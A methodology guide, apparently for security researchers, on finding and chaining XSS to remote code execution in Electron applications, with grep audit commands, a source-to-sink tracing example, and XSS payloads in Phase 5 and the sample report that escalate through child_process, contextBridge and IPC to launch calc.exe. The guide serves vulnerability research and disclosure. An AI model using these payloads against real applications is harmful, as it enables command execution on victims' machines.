---
title: Finding XSS→RCE Chains
description: Systematic methodology for finding and chaining XSS to RCE in Electron applications
---

# Finding XSS→RCE Chains

The XSS→RCE chain is what makes Electron bugs different from web bugs. A reflected XSS in a web app earns you cookie theft in the victim's browser session. The same XSS in an Electron app, in the right configuration, earns you a shell on their machine.

The methodology here is: establish whether RCE is achievable from renderer code execution *first*, before hunting for XSS. That way you know what you're looking for and how hard to push.

---

## Phase 1: Establish Whether RCE Is Reachable

Before finding XSS, you need to know what XSS gives you. The answer depends on the app's configuration:

```bash
# Step 1: Check BrowserWindow security settings:
grep -rn "nodeIntegration\|contextIsolation\|sandbox\|webSecurity" \
  --include="*.js" . | grep -v node_modules

# Step 2: Read all preload scripts:
grep -r "preload:" --include="*.js" . | grep -v node_modules
# Then read each preload file manually

# Step 3: Find IPC handlers with dangerous operations:
grep -r "ipcMain\.\(on\|handle\)" --include="*.js" . -A 15 | \
  grep -E "exec|spawn|child_process|readFile|writeFile|openExternal" | \
  grep -v node_modules
```

**Decision tree:**

- `nodeIntegration: true` → Any XSS = immediate RCE. Hunt for any DOM injection.
- `contextIsolation: false` → XSS gets preload scope. Find XSS + trace what the preload exposed.
- `contextIsolation: true`, tight bridge, no dangerous IPC handlers → XSS alone isn't enough. The chain probably doesn't exist here (or it's much harder). Move to a different target.
- `contextIsolation: true`, over-privileged bridge or dangerous IPC handlers → XSS + IPC injection. Find XSS + identify which channel to invoke.

---

## Phase 2: Map Attacker-Controlled Data Sources

You're looking for data that an attacker can influence that eventually reaches the renderer:

```bash
# Network responses (chat messages, profile data, notifications):
grep -rn "fetch\|XMLHttpRequest\|WebSocket\|EventSource\|net\.request" \
  --include="*.js" . | grep -v node_modules | grep -E "\.on|\.then|addEventListener"

# IPC callbacks — main process pushing data to renderer:
grep -rn "ipcRenderer\.on\b\|webContents\.send" --include="*.js" . | grep -v node_modules

# Storage sources — stored XSS patterns:
grep -rn "localStorage\.getItem\|sessionStorage\.getItem\|indexedDB" \
  --include="*.js" . | grep -v node_modules

# URL parameters — hash, search, deep link parameters:
grep -rn "location\.hash\|location\.search\|URLSearchParams\|searchParams" \
  --include="*.js" . | grep -v node_modules
```

For each source, trace what data it receives and where that data flows in the rendering code.

---

## Phase 3: Find HTML Injection Sinks

```bash
# Direct DOM injection:
grep -rn "\.innerHTML\b\|\.outerHTML\b\|insertAdjacentHTML\|document\.write\b" \
  --include="*.js" --include="*.jsx" --include="*.tsx" . | grep -v node_modules

# React:
grep -rn "dangerouslySetInnerHTML" \
  --include="*.jsx" --include="*.tsx" . | grep -v node_modules

# Markdown renderers (common XSS vector — check for DOMPurify wrapping):
grep -rn "marked\b\|marked\.\|showdown\|markdown-it\|remarkable\b\|snarkdown\|micromark" \
  --include="*.js" . | grep -v node_modules

# Check if DOMPurify is used:
grep -rn "DOMPurify\|dompurify" --include="*.js" . | grep -v node_modules
```

For Markdown renderers without DOMPurify, assume XSS is possible — verified against the Markdown spec later, but treat it as a lead.

---

## Phase 4: Trace Source to Sink

Read the file around each sink and work backward to find what data populates it:

```javascript
// Example: found this at chat.js:234:
chatDiv.innerHTML += messageContent;

// Read surrounding code to find what messageContent is:
// chat.js:220: const messageContent = renderMarkdown(msg.body);
// chat.js:205: const msg = await api.getMessage(id);
// api.js:88: // getMessage fetches from the server

// Chain:
// Server response (msg.body) → renderMarkdown → innerHTML
// Questions:
// 1. Does renderMarkdown sanitize output? (read it)
// 2. Can an attacker control msg.body on the server?
//    (check if this is user-generated content — messages, profiles, etc.)
```

This is the core of the work. For each source-sink pair, answer:
- Is the data attacker-controlled? (Can someone register an account and set a malicious value?)
- Does it flow to the sink without passing through DOMPurify or equivalent?
- Is there a CSP that would block script execution?

---

## Phase 5: Test Payloads

Once you've identified a candidate chain, test it:

### Confirm XSS with a benign payload

```javascript
// Non-destructive — changes the page title:
'<img src=x onerror="document.title=\'XSS\'">'

// Confirm execution without side effects first.
// If the title changes: XSS is confirmed.
```

### Probe what's available in the renderer

```javascript
'<img src=x onerror="document.title=typeof require+\'|\'+JSON.stringify(Object.keys(window).filter(k=>k.includes(\'api\')||k.includes(\'electron\')||k.includes(\'app\')||k.includes(\'bridge\')))">'

// Output: "undefined|[]" → no special APIs available
// Output: "function|[]" → nodeIntegration:true, require works
// Output: "undefined|[api,electronAPI]" → contextBridge exposed APIs
```

### Test the escalation path (with explicit authorization)

```javascript
// nodeIntegration: true:
'<img src=x onerror="require(\'child_process\').exec(\'calc.exe\')">'

// contextBridge with dangerous function:
'<img src=x onerror="window.api.runCommand(\'calc.exe\')">'

// IPC injection — call handler directly:
'<img src=x onerror="(async()=>{const {ipcRenderer}=window.__electron_ipc||{};const r=await window.electronAPI.invoke(\'exec-cmd\',\'calc.exe\');console.log(r)})()">'
```

---

## Phase 6: Document the Chain

Before reporting, write the full chain clearly:

```markdown
## Chain: [App] XSS→RCE via Markdown Renderer and IPC Injection

### Source
- File: src/renderer/chat.js:205
- Type: Server-provided content (chat message body)
- Attacker control: Any user can send a message to any channel
- No authentication check before rendering

### Taint Flow
1. `api.getMessage(id)` → returns `{ body: "attacker-controlled" }`
2. `renderMarkdown(msg.body)` → converts Markdown to HTML (no sanitization)
3. `chatDiv.innerHTML += result` → injects HTML into DOM

### Sink
- File: src/renderer/chat.js:234
- Type: innerHTML
- No DOMPurify, no CSP, Electron version has contextIsolation: false

### Escalation
- contextIsolation: false → XSS accesses preload's window.api
- window.api.runCommand() → ipcRenderer.invoke('run-command', cmd)
- ipcMain.handle('run-command', ...) → exec(cmd)

### Working PoC
```
Message body: <img src=x onerror="window.api.runCommand('calc.exe')">
```

### ACID Assessment
- **A:** Attacker-controlled — any registered user can send messages
- **C:** Chain is complete — no sanitization in renderMarkdown, no validation in IPC handler
- **I:** Arbitrary OS command execution as victim user
- **D:** No CSP, no DOMPurify, contextIsolation disabled

### Verdict: CONFIRMED — HIGH confidence
```

---

## Checklist

Before submitting:

- [ ] Source is genuinely attacker-controlled (not just app-internal data)
- [ ] Sanitization was checked — is DOMPurify present? Does it cover this path?
- [ ] CSP was checked — is there a `script-src` policy that would block execution?
- [ ] Escalation path was verified — does the IPC handler actually call exec?
- [ ] The PoC was tested and produces observable impact (calc.exe, file write, etc.)
- [ ] Chain is documented from source to sink with file:line references
